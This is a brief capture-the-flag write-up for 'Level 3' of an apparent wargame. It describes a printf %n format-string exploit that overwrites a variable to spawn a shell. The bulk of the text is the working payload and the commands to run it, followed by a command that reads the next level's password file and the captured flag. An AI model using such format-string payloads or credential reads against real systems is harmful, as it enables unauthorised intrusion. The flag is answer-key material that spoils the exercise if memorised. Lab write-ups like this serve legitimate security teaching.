# Level 3

We exploit `%n` flag of printf to change the value of `m` variable and set it to the number of printed bytes (64) so that a shell is opened.

```bash
python -c 'print "\x8c\x98\x04\x08%060x%4$n"' > /tmp/level3
cat /tmp/level3 - | ./level3
cat /home/user/level4/.pass
```

**Flag:** `b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa`
